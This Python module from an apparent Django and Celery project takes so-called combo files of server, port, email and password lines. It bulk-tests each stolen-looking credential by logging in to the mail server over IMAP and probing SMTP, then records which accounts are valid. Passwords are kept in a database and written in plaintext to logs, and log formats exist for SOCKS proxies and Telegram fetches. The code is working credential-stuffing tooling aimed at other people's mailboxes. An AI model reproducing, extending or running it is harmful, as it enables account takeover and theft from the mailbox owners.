import asyncio

import aiofiles
import imaplib
import io
import os
import re
import smtplib
import zipfile
from asyncio import gather
from datetime import datetime
from django.utils import timezone 

import dns.resolver
from rest_framework.response import Response

from users.models import User
from validate_email_address import validate_email
from asgiref.sync import sync_to_async

from files.models import ExtractedData, UploadedFile
from files.service import logger
from root import settings
from root.celery import app

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'root.settings')


def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]



class SmtpDriver:
    """
    A class to handle SMTP connection checking.

    Methods:
        check_connection(email, password): Checks the SMTP connection for a given email and password.
    """

# async def check_connection(self, email, password):
#     """
#     Check the SMTP connection for a given email and password.

#     Args:
#         email (str): Email address to check.
#         password (str): Password for the email address.

#     Returns:
#         dict: Connection status and port information.
#     """
#     try:
#         # Load SMTP service and port configurations
#         async with aiofiles.open(os.path.join('app', 'static', 'json', 'inc_smtpservices.json'), 'r') as f:
#             content = await f.read()
#             smtp_services = json.loads(content)

#         async with aiofiles.open(os.path.join('app', 'static', 'json', 'inc_smtpports.json'), 'r') as f:
#             content = await f.read()
#             smtp_ports = json.loads(content)['smtpports']

#         email_domain = email.split('@')[1]
#         host = smtp_services["smtpservices"].get(email_domain, None)

#         if not host:
#             raise ValueError(f"No SMTP service found for domain: {email_domain}")

#         for port in smtp_ports:
#             smtp_server = aiosmtplib.SMTP(hostname=host.split(':')[0], port=port, start_tls=True, timeout=10)
#             try:
#                 print(f"[SMTP] Trying {host}:{port}")
#                 await smtp_server.connect()
#                 await smtp_server.login(email, password)
#                 await smtp_server.quit()

#                 # Save result to the database
#                 EmailCheck.objects.create(
#                     email=email,
#                     status='valid',
#                     check_type='SMTP',
#                 )
#                 return {'status': 'valid', 'port': port}
#             except aiosmtplib.SMTPAuthenticationError:
#                 await smtp_server.quit()
#             except Exception as e:
#                 print(f"[SMTP] {str(e)}")
#                 pass

#         # If all ports fail
#         EmailCheck.objects.create(
#             email=email,
#             status='invalid',
#             check_type='SMTP',
#         )
#         return {'status': 'invalid'}
#     except Exception as e:
#         # Save error to the database
#         try:
#             EmailCheck.objects.create(
#                 email=email,
#                 status='error',
#                 check_type='SMTP',
#             )
#         except IntegrityError:
#             pass  # Ignore if email already exists in the database
#         return {'status': 'error', 'error': str(e)}


# class ImapDriver:
#     """
#     A class to handle IMAP connection checking.
#
#     Methods:
#         check_connection(email, password): Checks the IMAP connection for a given email and password.
#     """
#
#     async def check_connection(self, email, password):
#         """
#         Check the IMAP connection for a given email and password.
#
#         Args:
#             email (str): Email address to check.
#             password (str): Password for the email address.
#
#         Returns:
#             dict: Connection status and port information.
#         """
#         try:
#             # Load IMAP service and port configurations
#             async with aiofiles.open(os.path.join('app', 'static', 'json', 'inc_imapservices.json'), 'r') as f:
#                 content = await f.read()
#                 imap_services = json.loads(content)
#
#             async with aiofiles.open(os.path.join('app', 'static', 'json', 'inc_imapports.json'), 'r') as f:
#                 content = await f.read()
#                 imap_ports = json.loads(content)['imapports']
#
#             email_domain = email.split('@')[1]
#             host = imap_services["imapservices"].get(email_domain, None)
#
#             if not host:
#                 raise ValueError(f"No IMAP service found for domain: {email_domain}")
#
#             for port in imap_ports:
#                 imap_server = aioimaplib.IMAP4_SSL(host, port, timeout=10)
#                 try:
#                     print(f"[IMAP] Trying {host}:{port}")
#                     await imap_server.wait_hello_from_server()
#                     response = await imap_server.login(email, password)
#                     await imap_server.logout()
#                     if response.result == "OK":
#                         # Save result to the database
#                         EmailCheck.objects.create(
#                             email=email,
#                             status='valid',
#                             check_type='IMAP',
#                         )
#                         return {'status': 'valid', 'port': port}
#                 except aioimaplib.AioImapException:
#                     await imap_server.close()
#                 except Exception as e:
#                     print(f"[IMAP] {str(e)}")
#                     pass
#
#             # If all ports fail
#             EmailCheck.objects.create(
#                 email=email,
#                 status='invalid',
#                 check_type='IMAP',
#             )
#             return {'status': 'invalid'}
#         except Exception as e:
#             # Save error to the database
#             try:
#                 EmailCheck.objects.create(
#                     email=email,
#                     status='error',
#                     check_type='IMAP',
#                 )
#             except IntegrityError:
#                 pass  # Ignore if email already exists in the database
#             return {'status': 'error', 'error': str(e)}
def extract_country_from_filename(filename):
    match = re.search(r'(?<=_)([A-Z]{2})(?=[_\W])', filename)
    if match:
        return match.group(1)
    return None


def get_email_bd_data():
    emails_data = []
    data = ExtractedData.objects.all()
    for el in data:
        emails_data.append({'smtp_server': el.provider, 'email': el.email, 'password': el.password})
    return emails_data


# Function to validate an IMAP server
def imapCheck(email, password, imapServerName):
    try:
        M = imaplib.IMAP4_SSL(imapServerName)
        M.login(email, password)
        return True
    except Exception as e:
        logger.debug(e)
        return False

async def process_chunk_from_file(chunk, results, uploaded_file, start_line=0):
    """
    Validates email addresses by checking SMTP and IMAP connectivity simultaneously.
    """
    line_number = start_line
    
    for cred in chunk:
        line_number += 1
        print(f"Processing credential: {cred}")
        if "|" not in cred and ":" not in cred:
            print(f"Skipping invalid format - no separator: {cred}")
            continue
            
        parts = cred.strip().split("|") if "|" in cred else cred.strip().split(":")
        if len(parts) != 4:
            print(f"Skipping invalid parts count: {len(parts)}")
            continue

        server, port, email, password = parts
        print(f"Processing email: {email} with server: {server} port: {port}")
        smtp_status = None
        imap_status = None
        provider_type = 'NONE'  # Default provider type

        try:
            match = re.match(r'^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})', email)
            if match:
                print(f"Email format valid: {email}")
                try:
                    # Use email domain for MX lookup
                    email_domain = email.split('@')[1]
                    print(f"Looking up MX records for domain: {email_domain}")                                     
                    records = dns.resolver.resolve(email_domain, 'MX')
                    mx_record = str(records[0].exchange)
                    print(f"Found MX record: {mx_record}")

                    server_connect = smtplib.SMTP()
                    server_connect.set_debuglevel(0)

                    try:
                        print(f"Attempting to connect to MX server: {mx_record}")
                        server_connect.connect(mx_record)
                        code, message = server_connect.helo(server)
                        print(f"HELO response code: {code}, message: {message}")
                        
                        if code == 250:
                            print(f"Connecting to SMTP server: {server}:{port}")
                            server_smtp = smtplib.SMTP(server, int(port))
                            code, message = server_smtp.helo(server)
                            print(f"SMTP HELO response: {code}, {message}")
                            if code == 250:
                                smtp_status = True
                                print("SMTP validation successful")
                                # Determine provider type based on server
                                if 'gmail' in server or 'yahoo' in server or 'outlook' in server:
                                    provider_type = 'BIG'
                                else:
                                    provider_type = 'PRIVATE'
                            else:
                                smtp_status = False
                            
                            print("Attempting IMAP check")
                            check_result = imapCheck(email, password, server)
                            imap_status = True if check_result else False
                            print(f"IMAP check result: {imap_status}")
                            
                            server_smtp.quit()
                        else:
                            smtp_status = False
                        server_connect.quit()                        
                        
                    except Exception as ex:
                        print(f"Connection error details: {str(ex)}")
                        logger.error(f"Connection error for {email}: {ex}")
                        
                except Exception as ex:
                    print(f"DNS resolution error details: {str(ex)}")
                    logger.error(f"DNS resolution error for {email}: {ex}")

            await sync_to_async(ExtractedData.objects.update_or_create)(
                email=email,
                defaults={
                    'smtp_is_valid': smtp_status,
                    'imap_is_valid': imap_status,
                    'uploaded_file': uploaded_file,
                    'line_number': line_number,
                    'provider_type': provider_type
                }
            )

            result = {
                'email': email,
                'password': password, 
                'status': smtp_status,
                'imap_status': imap_status,
                'line_number': line_number,
                'provider_type': provider_type
            }
            results.append(result)

            logger.info({
                'email': email,
                'password': password,
                'smtp_valid': smtp_status, 
                'imap_valid': imap_status,
                'line_number': line_number,
                'provider_type': provider_type,
                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })

        except Exception as e:
            print(f"General error details: {str(e)}")
            logger.error(f"Error processing email {email} at line {line_number}: {e}")


async def process_chunk_from_db(chunk, smtp_results):
    thread_num = asyncio.current_task().get_name()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    email = chunk.get('email')
    name, server = email.split('@')
    smtp_server = 'smtp.' + server
    password = chunk.get('password')
    port = 587

    try:
        match = re.match(r'^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$', email)
        if match:
            try:
                records = dns.resolver.resolve("mail.ru", 'MX')
                mx_record = records[0].exchange
                mx_record = str(mx_record)
                if mx_record is not None:
                    server = smtplib.SMTP()
                    server.set_debuglevel(0)
                    server.connect(mx_record)
                    code, message = server.helo(smtp_server)
                    server = smtplib.SMTP(smtp_server, 587)
                    if code == 250:
                        result_2 = validate_email(email, check_mx=False)
                        print(result_2)
                        if result_2:
                            status = 'VALID'
                        elif result_2 == False:
                            status = 'INVALID'
                        else:
                            status = 'ERROR'
            except Exception as ex:
                status = 'ERROR'
                print(ex)

        smtp_result = {'email': email, 'password': password, 'status': status,
                       'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        smtp_results.append(smtp_result)

        logger.info({'email': email,
                     'password': password,
                     'valid': status,
                     'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')})
        
        # Add formatted logging
        log_entry = LogFormatter.format_smtp_log(
            thread_num=thread_num,
            timestamp=timestamp, 
            server=smtp_server,
            user=email,
            port=port,
            response=str(code),
            status=status
        )
        
        async with aiofiles.open(settings.LOG_FILES['smtp'], 'a') as f:
            await f.write(log_entry + '\n')

    except Exception as e:
        logger.error(f"Error checking connection for email {email}: {e}")


@app.task
async def imap_process_chunk_from_db(chunk, imap_results):
    """Validates email addresses via IMAP protocol using data loaded from database"""
    thread_num = asyncio.current_task().get_name()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    email = chunk.get('email')
    name, server = email.split('@')
    imap_server = 'imap.' + server
    password = chunk.get('password')
    port = 993

    try:
        match = re.match(r'^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$', email)
        if match:
            try:
                records = dns.resolver.resolve("mail.ru", 'MX')
                mx_record = records[0].exchange
                mx_record = str(mx_record)
                if mx_record is not None:
                    try:
                        imap_check_result = imapCheck(email, password, imap_server)
                        if imap_check_result:
                            imap_status = 'VALID'
                        else:
                            imap_status = 'INVALID'
                    except Exception as ex:
                        imap_status = 'ERROR'
                        print(ex)
            except Exception as ex:
                imap_status = 'ERROR'
                print(ex)

        imap_result = {'email': email, 'password': password, 'status': imap_status,
                       'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        imap_results.append(imap_result)

        logger.info({'email': email,
                     'password': password,
                     'valid': imap_status,
                     'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')})
        
        log_entry = LogFormatter.format_imap_log(
            thread_num=thread_num,
            timestamp=timestamp,
            server=imap_server, 
            user=email,
            port=port,
            status=imap_status
        )
        
        async with aiofiles.open(settings.LOG_FILES['imap'], 'a') as f:
            await f.write(log_entry + '\n')

    except Exception as e:
        logger.error(f"Error checking connection for email {email}: {e}")


async def check_smtp_imap_emails_from_zip(filename):
    """
    Main function for processing files
    """
    results = []
    file_path = os.path.join('/app/root/', 'uploads', filename)
    logger.info(f"Processing file at: {file_path}")

    try:
        uploaded_file = await sync_to_async(UploadedFile.objects.filter(filename=filename).latest)('upload_date')
    except UploadedFile.DoesNotExist:
        user = await sync_to_async(User.objects.first)()
        uploaded_file = await sync_to_async(UploadedFile.objects.create)(
            filename=filename,
            file_path=file_path,
            user=user
        )

    if filename.endswith('.zip'):
        with zipfile.ZipFile(file_path, 'r') as zip_file:
            for zip_info in zip_file.infolist():
                if not zip_info.is_dir():
                    with io.TextIOWrapper(zip_file.open(zip_info), encoding='utf-8') as f:
                        lines = f.readlines()
                        chunk_size = 10
                        chunked_lines = list(chunks(lines, chunk_size))
                        tasks = []
                        for i, chunk in enumerate(chunked_lines):
                            start_line = i * chunk_size
                            tasks.append(process_chunk_from_file(chunk, results, uploaded_file, start_line))
                        await gather(*tasks)
    else:
        async with aiofiles.open(file_path, 'r') as f:
            lines = await f.readlines()
            chunk_size = 10
            chunked_lines = list(chunks(lines, chunk_size))
            tasks = []
            for i, chunk in enumerate(chunked_lines):
                start_line = i * chunk_size
                tasks.append(process_chunk_from_file(chunk, results, uploaded_file, start_line))
            await gather(*tasks)

    for el in results:
        obj, created = await sync_to_async(ExtractedData.objects.update_or_create)(
            email=el['email'],
            defaults={
                'smtp_is_valid': el['status'],
                'imap_is_valid': el['imap_status'],
                'uploaded_file': uploaded_file,
                'line_number': el['line_number']
            }
        )


async def read_logs(ind):
    """
    Reads SMTP and IMAP logs from temp log files.

    Creates empty log files if they don't exist.
    Returns the last 100 lines of logs starting from the given index.
    """
    smtp_log_path = os.path.join("app", "data", "temp_logs", 'temp_smtp.log')
    imap_log_path = os.path.join("app", "data", "temp_logs", 'temp_imap.log')

    if not os.path.exists(smtp_log_path):
        async with aiofiles.open(smtp_log_path, 'w') as smtp_file:
            await smtp_file.write('')

    if not os.path.exists(imap_log_path):
        async with aiofiles.open(imap_log_path, 'w') as imap_file:
            await imap_file.write('')

    async with aiofiles.open(smtp_log_path, 'r') as smtp_file, aiofiles.open(imap_log_path, 'r') as imap_file:
        smtp_lines = await smtp_file.readlines()
        imap_lines = await imap_file.readlines()

    smtp_logs = list(map(lambda line: line.strip(), smtp_lines))[ind:ind + 100]
    imap_logs = list(map(lambda line: line.strip(), imap_lines))[ind:ind + 100]

    return {"smtp_logs": smtp_logs, "imap_logs": imap_logs, "n": len(smtp_logs)}

class LogFormatter:
    @staticmethod
    def format_smtp_log(thread_num, timestamp, server, user, port, response, status):
        return f"{thread_num}|{timestamp}|{server}|{user}|{port}|{response}|{status}"

    @staticmethod
    def format_imap_log(thread_num, timestamp, server, user, port, status):
        return f"{thread_num}|{timestamp}|{server}|{user}|{port}|{status}"
        
    @staticmethod
    def format_socks_log(thread_num, timestamp, proxy_port, result):
        return f"{thread_num}|{timestamp}|{proxy_port}|{result}"

    @staticmethod
    def format_url_fetch_log(thread_num, timestamp, filename, url, size, lines, status):
        return f"{thread_num}|{timestamp}|{filename}|{url}|{size}|{lines}|{status}"

    @staticmethod
    def format_telegram_fetch_log(timestamp, filename, url, size, lines, status):
        return f"{timestamp}|{filename}|{url}|{size}|{lines}|{status}"

# @app.task
def auto_process_combo_files():
    """
    Automatically processes all files in media/combofiles directory
    Returns the number of files processed
    """
    print("Starting auto_process_combo_files")
    combo_dir = os.path.join('/app', "combofiles")    
    processed_count = 0
    
    try:
        print("Getting event loop")
        loop = asyncio.get_event_loop()
    except RuntimeError:
        print("Creating new event loop")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    print(f"Scanning directory: {combo_dir}")
    for filename in os.listdir(combo_dir):
        print(f"Found file: {filename}")
        if filename.endswith(('.txt', '.zip')):
            print(f"Processing file: {filename}")
            try:
                loop.run_until_complete(check_smtp_imap_emails_from_zip(filename))
                processed_count += 1
                print(f"Successfully processed file: {filename}")
                logger.info(f"Successfully processed file: {filename}")
            except Exception as e:
                print(f"Error processing file {filename}: {str(e)}")
                logger.error(f"Error processing file {filename}: {e}")
                continue

    print(f"Finished processing. Total files processed: {processed_count}")
    return processed_count


def clear_logs(path):
    if os.path.exists(path):
        os.remove(path)
        return Response({"message": "Log cleared successfully"}, status=200)
    else:
        return Response({"message": "Log file not found"}, status=404)


from celery import shared_task

@shared_task(name='process_smtp_imap_check', queue='smtp_imap_queue')
def process_smtp_imap_background(file_path):
    """
    Celery task for SMTP/IMAP checking with explicit timing
    """
    # Find the uploaded file
    uploaded_file = UploadedFile.objects.get(file_path=file_path)
    
    # Mark processing start time
    uploaded_file.processing_start_time = timezone.now()
    uploaded_file.save()

    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    results = loop.run_until_complete(check_smtp_imap_emails_from_zip(file_path))

    # Mark processing end time
    uploaded_file.processing_end_time = timezone.now()
    uploaded_file.save()

    return {
        'status': 'completed',
        'file': file_path,
        'results': results
    }
